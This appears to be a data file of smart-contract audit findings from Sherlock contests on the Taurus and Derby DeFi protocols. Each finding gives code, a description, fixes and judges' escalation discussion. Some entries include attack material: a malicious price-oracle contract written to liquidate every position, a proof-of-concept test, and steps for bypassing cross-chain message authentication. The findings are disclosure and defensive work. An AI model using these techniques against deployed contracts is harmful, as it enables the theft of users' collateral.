Mint limit is not reduced when the Vault is burning TAUчmediumч```\n    function _decreaseCurrentMinted(address account, uint256 amount) internal virtual {\n        // If the burner is a vault, subtract burnt TAU from its currentMinted.\n        // This has a few highly unimportant edge cases which can generally be rectified by increasing the relevant vault's mintLimit.\n        uint256 accountMinted = currentMinted[account];\n        if (accountMinted >= amount) {\n            currentMinted[msg.sender] = accountMinted - amount;\n        }\n    }\n```\nчUpon burning TAU, it incorrectly updates the `currentMinted` when Vault is acting on behalf of users.\nWhen the burn of `TAU` is performed, it calls `_decreaseCurrentMinted` to reduce the limit of tokens minted by the Vault:\n```\n    function _decreaseCurrentMinted(address account, uint256 amount) internal virtual {\n        // If the burner is a vault, subtract burnt TAU from its currentMinted.\n        // This has a few highly unimportant edge cases which can generally be rectified by increasing the relevant vault's mintLimit.\n        uint256 accountMinted = currentMinted[account];\n        if (accountMinted >= amount) {\n            currentMinted[msg.sender] = accountMinted - amount;\n        }\n    }\n```\n\nThe issue is that it subtracts `accountMinted` (which is currentMinted[account]) from `currentMinted[msg.sender]`. When the vault is burning tokens on behalf of the user, the `account` != `msg.sender` meaning the `currentMinted[account]` is 0, and thus the `currentMinted` of Vault will be reduced by 0 making it pretty useless.\nAnother issue is that users can transfer their `TAU` between accounts, and then `amount > accountMinted` will not be triggered.чA simple solution would be to:\n```\n     uint256 accountMinted = currentMinted[msg.sender];\n```\n\nBut I suggest revisiting and rethinking this function altogether.\nDiscussion\nSierraescape\nhttps://github.com/protokol/taurus-contracts/pull/85ч`currentMinted` is incorrectly decreased upon burning so vaults do not get more space to mint new tokens.\nCode Snippet\nTool used\nManual Review
Account can not be liquidated when price fall by 99%.чmediumч```\nuint256 collateralToLiquidateWithoutDiscount = (_debtToLiquidate * (10 ** decimals)) / price;\ncollateralToLiquidate = (collateralToLiquidateWithoutDiscount * totalLiquidationDiscount) / Constants.PRECISION;\nif (collateralToLiquidate > _accountCollateral) {\n            collateralToLiquidate = _accountCollateral;\n}\nuint256 liquidationSurcharge = (collateralToLiquidateWithoutDiscount * LIQUIDATION_SURCHARGE) / Constants.PRECISION\n```\nчLiquidation fails when price fall by 99%.\n`_calcLiquidation()` method has logic related to liquidations. This method calculate total liquidation discount, collateral to liquidate and liquidation surcharge. All these calculations looks okay in normal scenarios but there is an edge case when liquidation fails if price crashes by 99% or more. In such scenario `collateralToLiquidateWithoutDiscount` will be very large and calculated liquidation surcharge becomes greater than `collateralToLiquidate`\n```\nuint256 collateralToLiquidateWithoutDiscount = (_debtToLiquidate * (10 ** decimals)) / price;\ncollateralToLiquidate = (collateralToLiquidateWithoutDiscount * totalLiquidationDiscount) / Constants.PRECISION;\nif (collateralToLiquidate > _accountCollateral) {\n            collateralToLiquidate = _accountCollateral;\n}\nuint256 liquidationSurcharge = (collateralToLiquidateWithoutDiscount * LIQUIDATION_SURCHARGE) / Constants.PRECISION\n```\n\nContract revert from below line hence liquidation will fail in this scenario.\n```\nuint256 collateralToLiquidator = collateralToLiquidate - liquidationSurcharge;\n```\nчPresently liquidation surcharge is calculated on `collateralToLiquidateWithoutDiscount`. Project team may want to reconsider this logic and calculate surcharge on `collateralToLiquidate` instead of `collateralToLiquidateWithoutDiscount`. This will be business decision but easy fix\nAnother option is you may want to calculate surcharge on `Math.min(collateralToLiquidate, collateralToLiquidateWithoutDiscount)`.\n```\n        uint256 collateralToTakeSurchargeOn = Math.min(collateralToLiquidate, collateralToLiquidateWithoutDiscount);\n        uint256 liquidationSurcharge = (collateralToTakeSurchargeOn * LIQUIDATION_SURCHARGE) / Constants.PRECISION;\n        return (collateralToLiquidate, liquidationSurcharge);\n```\n\nDiscussion\nSierraescape\nhttps://github.com/protokol/taurus-contracts/pull/122\nhrishibhat\nSince this is an edge case for the given price fall resulting in reverting liquidations, Considering this as a valid medium\nIAm0x52\nEscalate for 10 USDC\nThis is the same root cause as #89 that the liquidation surcharge is calculated based on the uncapped amount. This is another symptom of that same underlying problem, so it should be a dupe of #89\nsherlock-admin\nEscalate for 10 USDC\nThis is the same root cause as #89 that the liquidation surcharge is calculated based on the uncapped amount. This is another symptom of that same underlying problem, so it should be a dupe of #89\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nspyrosonic10\nEscalate for 10 USDC\nI do not agree with escalation raised above. This issue is about failure of liquidation when price fall by x%. This finding is an edge case where it does impact all underwater accounts so it is fair to say that it impact whole protocol. Root cause and impact both are different in this issue compare to #89 so this is definitely not a duplicate of #89.\nsherlock-admin\nEscalate for 10 USDC\nI do not agree with escalation raised above. This issue is about failure of liquidation when price fall by x%. This finding is an edge case where it does impact all underwater accounts so it is fair to say that it impact whole protocol. Root cause and impact both are different in this issue compare to #89 so this is definitely not a duplicate of #89.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nAccepting the first escalation. After further internal discussion, both the outcomes originate out of the same root cause of using `collateralToLiquidateWithoutDiscount` to calculate `liquidationSurcharge`. While one mentions increase in the fee the other instance increases to cause underflow. Considering #89 a duplicate of this issue.\nsherlock-admin\nEscalation accepted\nAccepting the first escalation. After further internal discussion, both the outcomes originate out of the same root cause of using `collateralToLiquidateWithoutDiscount` to calculate `liquidationSurcharge`. While one mentions increase in the fee the other instance increases to cause underflow. Considering #89 a duplicate of this issue.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.ч"Liquidation fails when price crash by 99% or more. Expected behaviour is that liquidation should be successful in all scenarios.\nCode Snippet\nBelow is POC that prove failed liquidation.\n```\nit(""should revert liquidation if an account is unhealthy and price crashed 99%"", async () => {\n        // Assume price is crashed 99%\n        await glpOracle.updatePrice(PRECISION.mul(1).div(100));\n        // check if the account is underwater\n        const health = await gmxVault.getAccountHealth(user.address);\n        expect(health).eq(false);\n\n        // Check the liquidation amount\n        const liqAmt = await gmxVault.getMaxLiquidation(user.address);\n\n        // Mint some TAU to the liquidator and approve vault to spend it\n        await mintHelper(liqAmt, liquidator.address);\n        await tau.connect(liquidator).approve(gmxVault.address, liqAmt);\n        const totalTauSupply = await tau.totalSupply();\n\n        // liquidation will fail\n        const tx = gmxVault.connect(liquidator).liquidate(user.address, liqAmt, 0);\n        // reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)\n        await expect(tx).revertedWithPanic(0x11);\n      });\n```\n\nPS: This test goes in 00_GmxYieldAdapter.ts and inside describe(""Liquidate"", async () => { block defined at line 269\nTool used\nManual Review"
Protocol is will not work on most of the supported blockchains due to hardcoded WETH contract address.чmediumч```\naddress internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n```\nчThe WETH address is hardcoded in the `Swap` library.\n```\naddress internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n```\nчThe WETH variable should be immutable in the Vault contract instead of a constant in the Swap library and the Wrapped Native Token contract address should be passed in the Vault constructor on each separate deployment.чProtocol will not work on most of the supported blockchains.\nCode Snippet\n```\naddress internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n```\n\nTool used\nManual Review
A malicious admin can steal all users collateralчmediumч```\n2. Multisig. Trusted with essentially everything but user collateral. \n```\nчAccording to Taurus contest details, all roles, including the admin `Multisig`, should not be able to drain users collateral.\n```\n2. Multisig. Trusted with essentially everything but user collateral. \n```\n\nhttps://app.sherlock.xyz/audits/contests/45 But the current implementation allows admin to update price feed without any restriction, such as `timelock`. This leads to an attack vector that a malicious admin can steal all users collateral.\nHence, admin can set a malicious price oracle like\n```\ncontract AttackOracleWrapper is IOracleWrapper, Ownable {\n    address public attacker;\n    IGLPManager public glpManager;\n\n    constructor(address _attacker, address glp) {\n        attacker = _attacker;\n        glpManager = IGLPManager(glp);\n    }\n\n    function getExternalPrice(\n        address _underlying,\n        bytes calldata _flags\n    ) external view returns (uint256 price, uint8 decimals, bool success) {\n        if (tx.origin == attacker) {\n            return (1, 18, true); // @audit a really low price resulting in the liquidation of all positions\n        } else {\n            uint256 price = glpManager.getPrice();\n            return (price, 18, true);\n        }\n    }\n}\n```\n\nThen call `liquidate()` to drain out users collateral with negligible $TAU cost.чupdate of price oracle should be restricted with a `timelock`.\nDiscussion\niHarishKumar\nhttps://github.com/protokol/taurus-contracts/pull/128\nspyrosonic10\nEscalate for 10 USDC\nPriceOracleManger is Ownable contract so yes it has `owner` param and not `governor` param. So here `owner` can be `governor`, timelock and multisig. Also when it come to calling `updateWrapper` multisig can be trusted as it can be trusted to not set deposit fee to max and loot all users. So with that being said this is info/low issue and does not qualify for medium. It may be possible that is entirely out of scope as it is related to admin controlled param.\nsherlock-admin\nEscalate for 10 USDC\nPriceOracleManger is Ownable contract so yes it has `owner` param and not `governor` param. So here `owner` can be `governor`, timelock and multisig. Also when it come to calling `updateWrapper` multisig can be trusted as it can be trusted to not set deposit fee to max and loot all users. So with that being said this is info/low issue and does not qualify for medium. It may be possible that is entirely out of scope as it is related to admin controlled param.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation rejected\nGiven that the protocol clearly mentions that admin should be restricted whenever possible from affecting the user collateral adding the restriction makes sense. Considering this issue a valid medium.\nsherlock-admin\nEscalation rejected\nGiven that the protocol clearly mentions that admin should be restricted whenever possible from affecting the user collateral adding the restriction makes sense. Considering this issue a valid medium.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.чA malicious admin can steal all users collateral\nCode Snippet\nTool used\nManual Review
Cross-chain message authentication can be bypassed, allowing an attacker to disrupt the state of vaultsчhighч"```\nmodifier onlySource(address _originSender, uint32 _origin) {\n  require(_originSender == trustedRemoteConnext[_origin] && msg.sender == connext, ""Not trusted"");\n  _;\n}\n```\n"ч"A malicious actor may send a cross-chain message to an `XProvider` contract and bypass the `onlySource` authentication check. As a result, they'll be able to call any function in the `XProvider` contract that has the `onlySource` modifier and disrupt the state of `XChainController` and all vaults.\nThe protocol integrates with Connext to handle cross-chain interactions. `XProvider` is a contract that manages interactions between vaults deployed on all supported networks and `XChainController`. `XProvider` is deployed on each of the network where a vault is deployed and is used to send and receive cross-chain messages via Connext. `XProvider` is a core contract that handles vault rebalancing, transferring of allocations from Game to `XChainController` and to vaults, transferring of tokens deposited to vaults between vault on different networks. Thus, it's critical that the functions of this contract are only called by authorized actors.\nTo ensure that cross-chain messages are sent from authorized actors, there's onlySource modifier that's applied to the xReceive function. The modifier checks that the sender of a message is trusted:\n```\nmodifier onlySource(address _originSender, uint32 _origin) {\n  require(_originSender == trustedRemoteConnext[_origin] && msg.sender == connext, ""Not trusted"");\n  _;\n}\n```\n\nHowever, it doesn't check that `trustedRemoteConnext[_origin]` is set (i.e. it's not the zero address), and `_originSender` can in fact be the zero address.\nIn Connext, a message can be delivered via one of the two paths: the fast path or the slow path. The fast path is taken when, on the destination, message receiving is not authentication, i.e. when destination allows receiving of messages from all senders. The slow path is taken when message receiving on the destination is authenticated, i.e. destination allows any sender (it doesn't check a sender).\nSince, `XProvider` always checks the sender of a message, only the slow path will be used by Connext to deliver messages to it. However, Connext always tries the slow path:\nRouters observing the origin chain with funds on the destination chain will: Simulate the transaction (if this fails, the assumption is that this is a more ""expressive"" crosschain message that requires authentication and so must go through the AMB: the slow path).\nI.e. it'll always send a message and see if it reverts on the destination or not: if it does, Connext will switch to the slow path.\nWhen Connext executes a message on the destination chain in the fast path, it sets the sender address to the zero address:\n```\n(bool success, bytes memory returnData) = ExcessivelySafeCall.excessivelySafeCall(\n  _params.to,\n  gasleft() - Constants.EXECUTE_CALLDATA_RESERVE_GAS,\n  0, // native asset value (always 0)\n  Constants.DEFAULT_COPY_BYTES, // only copy 256 bytes back as calldata\n  abi.encodeWithSelector(\n    IXReceiver.xReceive.selector,\n    _transferId,\n    _amount,\n    _asset,\n    _reconciled ? _params.originSender : address(0), // use passed in value iff authenticated\n    _params.originDomain,\n    _params.callData\n  )\n);\n```\n\nThus, Connext will try to call the `XProvider.xReceive` function with the `_originSender` argument set to the zero address. And there are situations when the `onlySource` modifier will pass such calls: when the origin network (as specified by the `_origin` argument) is not in the `trustedRemoteConnext` mapping.\nAccording to the description of the project, it'll be deployed on the following networks:\nMainnet, Arbitrum, Optimism, Polygon, Binance Smart Chain\nAnd this is the list of networks supported by Connext:\nEthereum Mainnet Polygon Optimism Arbitrum One Gnosis Chain BNB Chain\nThus, a malicious actor can send a message from Gnosis Chain (it's not supported by Derby), and the `onlySource` modifier will pass the message. The same is true for any new network supported by Connext in the future and not supported by Derby."чIn the `onlySource` modifier, consider checking that `trustedRemoteConnext[_origin]` doesn't return the zero address:\nDiscussion\nJeiwan\nEscalate for 10 USDC\nThis was mistakenly marked as a duplicate.\nThis report points at the weak cross-chain messages authentication, which allows an attacker to send fake cross-chain messages and pass the authentication check. This basically disrupts the rebalancing and allows the attacker to manipulate token allocations for their profit (and for the loss of everyone else) or even lock rebalancing indefinitely.\nsherlock-admin\nEscalate for 10 USDC\nThis was mistakenly marked as a duplicate.\nThis report points at the weak cross-chain messages authentication, which allows an attacker to send fake cross-chain messages and pass the authentication check. This basically disrupts the rebalancing and allows the attacker to manipulate token allocations for their profit (and for the loss of everyone else) or even lock rebalancing indefinitely.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nTheezr\nValid high issue\nhrishibhat\nEscalation accepted\nThis is a valid high issue\nsherlock-admin\nEscalation accepted\nThis is a valid high issue\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.ч"A malicious actor can call `XProvider.xReceive` and any functions of `XProvider` with the `onlySelf` modifier:\nxReceive allow the caller to call any public function of `XProvider`, but only the ones with the `onlySelf` modifier are authorized;\nreceiveAllocations can be used to corrupt allocations in the `XChainController` (i.e. allocate all tokens only to the protocol the attacker will benefit the most from);\nreceiveTotalUnderlying can be used to set wrong ""total underlying"" value in the `XChainController` and block rebalancing of vaults (due to an underflow or another arithmetical error);\nreceiveSetXChainAllocation can be used to set an exchange rate that will allow an attacker to drain a vault by redeeming their LP tokens at a higher rate;\nreceiveFeedbackToXController can be used to trick the `XChainController` into skipping receiving of funds from a vault;\nreceiveProtocolAllocationsToVault can be used by an attacker to unilaterally set allocations in a vault, directing funds only to protocol the attacker will benefit from;\nreceiveRewardsToGame can be used by an attacker to increase the reward per LP token in a protocol the attacker deposited to;\nfinally, receiveStateFeedbackToVault can allow an attacker to switch off a vault and exclude it from rebalancing.\nCode Snippet\nTool used\nManual Review"
Anyone can execute certain functions that use cross chain messages and potentially cancel them with potential loss of funds.чhighч```\n    uint256 relayerFee = _relayerFee != 0 ? _relayerFee : msg.value;\n    IConnext(connext).xcall{value: relayerFee}(\n      _destinationDomain, // _destination: Domain ID of the destination chain\n      target, // _to: address of the target contract\n      address(0), // _asset: use address zero for 0-value transfers\n      msg.sender, // _delegate: address that can revert or forceLocal on destination\n      0, // _amount: 0 because no funds are being transferred\n      0, // _slippage: can be anything between 0-10000 because no funds are being transferred\n      _callData // _callData: the encoded calldata to send\n    );\n  }\n```\nч"Certain functions that route messages cross chain on the `Game` and `MainVault` contract are unprotected (anyone can call them under the required state of the vaults). The way the cross chain messaging is implemented in the XProvider makes use of Connext's `xcall()` and sets the `msg.sender` as the `delegate` and `msg.value` as `relayerFee`. There are two possible attack vectors with this:\nEither an attacker can call the function and set the msg.value to low so it won't be relayed until someone bumps the fee (Connext allows anyone to bump the fee). This however means special action must be taken to bump the fee in such a case.\nOr the attacker can call the function (which irreversibly changes the state of the contract) and as the delegate of the `xcall` cancel the message. This functionality is however not yet active on Connext, but the moment it is the attacker will be able to change the state of the contract on the origin chain and make the cross chain message not execute on the destination chain leaving the contracts on the two chains out of synch with possible loss of funds as a result.\nThe `XProvider` contract's `xsend()` function sets the `msg.sender` as the delegate and `msg.value` as `relayerFee`\n```\n    uint256 relayerFee = _relayerFee != 0 ? _relayerFee : msg.value;\n    IConnext(connext).xcall{value: relayerFee}(\n      _destinationDomain, // _destination: Domain ID of the destination chain\n      target, // _to: address of the target contract\n      address(0), // _asset: use address zero for 0-value transfers\n      msg.sender, // _delegate: address that can revert or forceLocal on destination\n      0, // _amount: 0 because no funds are being transferred\n      0, // _slippage: can be anything between 0-10000 because no funds are being transferred\n      _callData // _callData: the encoded calldata to send\n    );\n  }\n```\n\n`xTransfer()` using `msg.sender` as delegate:\n```\n    IConnext(connext).xcall{value: (msg.value - _relayerFee)}(\n      _destinationDomain, // _destination: Domain ID of the destination chain\n      _recipient, // _to: address receiving the funds on the destination\n      _token, // _asset: address of the token contract\n      msg.sender, // _delegate: address that can revert or forceLocal on destination\n      _amount, // _amount: amount of tokens to transfer\n      _slippage, // _slippage: the maximum amount of slippage the user will accept in BPS (e.g. 30 = 0.3%)\n      bytes("""") // _callData: empty bytes because we're only sending funds\n    );\n  }\n```\n\nConnext documentation explaining:\n```\nparams.delegate | (optional) Address allowed to cancel an xcall on destination.\n```\n\nConnext documentation seems to indicate this functionality isn't active yet though it isn't clear whether that applies to the cancel itself or only the bridging back the funds to the origin chain."ч
maxTrainingDeposit can be bypassedчmediumч```\nfunction deposit(\n    uint256 _amount,\n    address _receiver\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 shares) {\n    if (training) {\n      require(whitelist[msg.sender]);\n      uint256 balanceSender = (balanceOf(msg.sender) * exchangeRate) / (10 ** decimals());\n      require(_amount + balanceSender <= maxTrainingDeposit);\n    }\n// rest of code\n```\nчIt was observed that User can bypass the `maxTrainingDeposit` by transferring balance from one user to another\nObserve the `deposit` function\n```\nfunction deposit(\n    uint256 _amount,\n    address _receiver\n  ) external nonReentrant onlyWhenVaultIsOn returns (uint256 shares) {\n    if (training) {\n      require(whitelist[msg.sender]);\n      uint256 balanceSender = (balanceOf(msg.sender) * exchangeRate) / (10 ** decimals());\n      require(_amount + balanceSender <= maxTrainingDeposit);\n    }\n// rest of code\n```\n\nSo if User balance exceeds maxTrainingDeposit then request fails (considering training is true)\nLets say User A has balance of 50 and maxTrainingDeposit is 100\nIf User A deposit amount 51 then it fails since 50+51<=100 is false\nSo User A transfer amount 50 to his another account\nNow when User A deposit, it does not fail since `0+51<=100`ч
MainVault.rebalanceXChain doesn't check that savedTotalUnderlying >= reservedFundsчmediumч```\n  function rebalanceXChain(uint256 _slippage, uint256 _relayerFee) external payable {\n    require(state == State.SendingFundsXChain, stateError);\n\n\n    if (amountToSendXChain > getVaultBalance()) pullFunds(amountToSendXChain);\n    if (amountToSendXChain > getVaultBalance()) amountToSendXChain = getVaultBalance();\n\n\n    vaultCurrency.safeIncreaseAllowance(xProvider, amountToSendXChain);\n    IXProvider(xProvider).xTransferToController{value: msg.value}(\n      vaultNumber,\n      amountToSendXChain,\n      address(vaultCurrency),\n      _slippage,\n      _relayerFee\n    );\n\n\n    emit RebalanceXChain(vaultNumber, amountToSendXChain, address(vaultCurrency));\n\n\n    amountToSendXChain = 0;\n    settleReservedFunds();\n  }\n```\nчMainVault.rebalanceXChain doesn't check that savedTotalUnderlying >= reservedAmount. Because of that, shortage can occur, if vault will lose some underlying during cross chain calls and reservedFundswill not be present in the vault.\n`reservedFunds` is the amount that is reserved to be withdrawn by users. It's increased by `totalWithdrawalRequests` amount every cycle, when `setXChainAllocation` is called.\n`setXChainAllocation` call is initiated by xController. This call provides vault with information about funds. In case if vault should send funds to the xController, then `SendingFundsXChain` state is set, aslo amount to send is stored.\n```\n  function rebalanceXChain(uint256 _slippage, uint256 _relayerFee) external payable {\n    require(state == State.SendingFundsXChain, stateError);\n\n\n    if (amountToSendXChain > getVaultBalance()) pullFunds(amountToSendXChain);\n    if (amountToSendXChain > getVaultBalance()) amountToSendXChain = getVaultBalance();\n\n\n    vaultCurrency.safeIncreaseAllowance(xProvider, amountToSendXChain);\n    IXProvider(xProvider).xTransferToController{value: msg.value}(\n      vaultNumber,\n      amountToSendXChain,\n      address(vaultCurrency),\n      _slippage,\n      _relayerFee\n    );\n\n\n    emit RebalanceXChain(vaultNumber, amountToSendXChain, address(vaultCurrency));\n\n\n    amountToSendXChain = 0;\n    settleReservedFunds();\n  }\n```\n\nAs you can see, function just pulls needed funds from providers if needed and sends them to xController. It doesn't check that after that amount that is held by vault is enough to cover `reservedFunds`. Because of that next situation can occur.\n1.Suppose that vault has 1000 tokens as underlying amount. 2.reservedFunds is 200. 3.xController calculated that vault should send 800 tokens to xController(vault allocations is 0) and 200 should be still in the vault in order to cover `reservedFunds`. 4.when vault is going to send 800 tokens(between `setXChainAllocation` and `rebalanceXChain` call), then loss happens and totalUnderlying becomes 800, so currently vault has only 800 tokens in total. 5.vault sends this 800 tokens to xController and has 0 to cover `reservedFunds`, but actually he should leave this 200 tokens in the vault in this case.\n```\n    if (amountToSendXChain > getVaultBalance()) pullFunds(amountToSendXChain);\n    if (amountToSendXChain > getVaultBalance()) amountToSendXChain = getVaultBalance();\n```\n\nI think that this is incorrect approach for withdrawing of funds as there is a risk that smth will happen with underlying amount in the providers, so it will be not enough to cover `reservedFunds` and calculations will be broken, users will not be able to withdraw. Same approach is done in `rebalance` function, which pulls `reservedFunds` after depositing to all providers. I guess that correct approach is not to touch `reservedFunds` amount. In case if you need to send amount to xController, then you need to withdraw it directly from provider. Of course if you have `getVaultBalance` that is bigger than `reservedFunds` + amountToSendXChain, then you can send them directly, without pulling.ч
Game doesn't accrued rewards for previous rebalance period in case if rebalanceBasket is called in next periodчmediumч```\n  function addToTotalRewards(uint256 _basketId) internal onlyBasketOwner(_basketId) {\n    if (baskets[_basketId].nrOfAllocatedTokens == 0) return;\n\n\n    uint256 vaultNum = baskets[_basketId].vaultNumber;\n    uint256 currentRebalancingPeriod = vaults[vaultNum].rebalancingPeriod;\n    uint256 lastRebalancingPeriod = baskets[_basketId].lastRebalancingPeriod;\n\n\n    if (currentRebalancingPeriod <= lastRebalancingPeriod) return;\n\n\n    for (uint k = 0; k < chainIds.length; k++) {\n      uint32 chain = chainIds[k];\n      uint256 latestProtocol = latestProtocolId[chain];\n      for (uint i = 0; i < latestProtocol; i++) {\n        int256 allocation = basketAllocationInProtocol(_basketId, chain, i) / 1E18;\n        if (allocation == 0) continue;\n\n\n        int256 lastRebalanceReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          lastRebalancingPeriod,\n          i\n        );\n        int256 currentReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          currentRebalancingPeriod,\n          i\n        );\n        baskets[_basketId].totalUnRedeemedRewards +=\n          (currentReward - lastRebalanceReward) *\n          allocation;\n      }\n    }\n  }\n```\nчGame doesn't accrued rewards for previous rebalance period in case if `rebalanceBasket` is called in next period. Because of that user do not receive rewards for the previous period and in case if he calls `rebalanceBasket` each rebalance period, he will receive rewards only for last one.\n```\n  function addToTotalRewards(uint256 _basketId) internal onlyBasketOwner(_basketId) {\n    if (baskets[_basketId].nrOfAllocatedTokens == 0) return;\n\n\n    uint256 vaultNum = baskets[_basketId].vaultNumber;\n    uint256 currentRebalancingPeriod = vaults[vaultNum].rebalancingPeriod;\n    uint256 lastRebalancingPeriod = baskets[_basketId].lastRebalancingPeriod;\n\n\n    if (currentRebalancingPeriod <= lastRebalancingPeriod) return;\n\n\n    for (uint k = 0; k < chainIds.length; k++) {\n      uint32 chain = chainIds[k];\n      uint256 latestProtocol = latestProtocolId[chain];\n      for (uint i = 0; i < latestProtocol; i++) {\n        int256 allocation = basketAllocationInProtocol(_basketId, chain, i) / 1E18;\n        if (allocation == 0) continue;\n\n\n        int256 lastRebalanceReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          lastRebalancingPeriod,\n          i\n        );\n        int256 currentReward = getRewardsPerLockedToken(\n          vaultNum,\n          chain,\n          currentRebalancingPeriod,\n          i\n        );\n        baskets[_basketId].totalUnRedeemedRewards +=\n          (currentReward - lastRebalanceReward) *\n          allocation;\n      }\n    }\n  }\n```\n\nThis function allows user to accrue rewards only when currentRebalancingPeriod > `lastRebalancingPeriod`. When user allocates, he allocates for the next period. And `lastRebalancingPeriod` is changed after `addToTotalRewards` is called, so after rewards for previous period accrued. And when allocations are sent to the xController, then new rebalance period is started. So actually rewards accruing for period that user allocated for is started once `pushAllocationsToController` is called. And at this point currentRebalancingPeriod == `lastRebalancingPeriod` which means that if user will call rebalanceBasket for next period, the rewards will not be accrued for him, but `lastRebalancingPeriod` will be incremented. So actually he will not receive rewards for previous period.\nExample. 1.currentRebalancingPeriod is 10. 2.user calls `rebalanceBasket` with new allocation and `lastRebalancingPeriod` is set to 11 for him. 3.pushAllocationsToController is called, so `currentRebalancingPeriod` becomes 11. 4.settleRewards is called, so rewards for the 11th cycle are accrued. 5.now user can call `rebalanceBasket` for the next 12th cycle. `addToTotalRewards` is called, but `currentRebalancingPeriod` == `lastRebalancingPeriod` == 11, so rewards were not accrued for 11th cycle 6.new allocations is saved and `lastRebalancingPeriod` becomes 12. 7.the loop continues and every time when user allocates for next rewards his `lastRebalancingPeriod` is increased, but rewards are not added. 8.user will receive his rewards for previous cycle, only if he skip 1 rebalance period(he doesn't allocate on that period).\nAs you can see this is very serious bug. Because of that, player that wants to adjust his allocation every rebalance period will loose all his rewards.чFirst of all, you need to allows to call `rebalanceBasket` only once per rebalance period, before new rebalancing period started and allocations are sent to xController. Then you need to change check inside `addToTotalRewards` to this `if (currentRebalancingPeriod < lastRebalancingPeriod) return;` in order to allow accruing for same period.чPlayer looses all his rewards\nCode Snippet\nProvided above\nTool used\nManual Review
Vault.blacklistProtocol can revert in emergencyчmediumч```\n  function blacklistProtocol(uint256 _protocolNum) external onlyGuardian {\n    uint256 balanceProtocol = balanceUnderlying(_protocolNum);\n    currentAllocations[_protocolNum] = 0;\n    controller.setProtocolBlacklist(vaultNumber, _protocolNum);\n    savedTotalUnderlying -= balanceProtocol;\n    withdrawFromProtocol(_protocolNum, balanceProtocol);\n  }\n```\nчVault.blacklistProtocol can revert in emergency, because it tries to withdraw underlying balance from protocol, which can revert for many reasons after it's hacked or paused.\n```\n  function blacklistProtocol(uint256 _protocolNum) external onlyGuardian {\n    uint256 balanceProtocol = balanceUnderlying(_protocolNum);\n    currentAllocations[_protocolNum] = 0;\n    controller.setProtocolBlacklist(vaultNumber, _protocolNum);\n    savedTotalUnderlying -= balanceProtocol;\n    withdrawFromProtocol(_protocolNum, balanceProtocol);\n  }\n```\n\nThe problem is that this function is trying to withdraw all balance from protocol. This can create problems as in case of hack, attacker can steal funds, pause protocol and any other things that can make `withdrawFromProtocol` function to revert. Because of that it will be not possible to add protocol to blacklist and as result system will stop working correctly.ч"Provide `needToWithdraw` param to the `blacklistProtocol` function. In case if it's safe to withdraw, then withdraw, otherwise, just set protocol as blacklisted. Also you can call function with `true` param again, once it's safe to withdraw. Example of hack situation flow: 1.underlying vault is hacked 2.you call setProtocolBlacklist(""vault"", false) which blacklists vault 3.in next tx you call setProtocolBlacklist(""vault"", true) and tries to withdraw\nDiscussion\nsjoerdsommen\nDisagree with severity because it's unlikely to result in (extra) loss of funds\nDiscussion\nsjoerdsommen\nDisagree with severity because it's unlikely to result in (extra) loss of funds"чHacked or paused protocol can't be set to blacklist.\nCode Snippet\nProvided above\nTool used\nManual Review
The protocol could not handle multiple vaults correctlyчmediumч```\n  function rebalanceNeeded() public view returns (bool) {\n    return (block.timestamp - lastTimeStamp) > rebalanceInterval || msg.sender == guardian;\n  }\n```\nч"The protocol needs to handle multiple vaults correctly. If there are three vaults (e.g.USDC, USDT, DAI) the protocol needs to rebalance them all without any problems\nThe protocol needs to invoke pushAllocationsToController() every `rebalanceInterval` to push totalDeltaAllocations from Game to xChainController.\n`pushAllocationsToController()` invoke `rebalanceNeeded()` to check if a rebalance is needed based on the set interval and it uses the state variable `lastTimeStamp` to do the calculations\n```\n  function rebalanceNeeded() public view returns (bool) {\n    return (block.timestamp - lastTimeStamp) > rebalanceInterval || msg.sender == guardian;\n  }\n```\n\nBut in the first invoking (for USDC vault) of `pushAllocationsToController()` it will update the state variable `lastTimeStamp` to the current `block.timestamp`\n```\nlastTimeStamp = block.timestamp;\n```\n\nNow when you invoke (for DAI vault) `pushAllocationsToController()`. It will revert because of\n```\nrequire(rebalanceNeeded(), ""No rebalance needed"");\n```\n\nSo if the protocol has two vaults or more (USDC, USDT, DAI) you can only do one rebalance every `rebalanceInterval`"ч
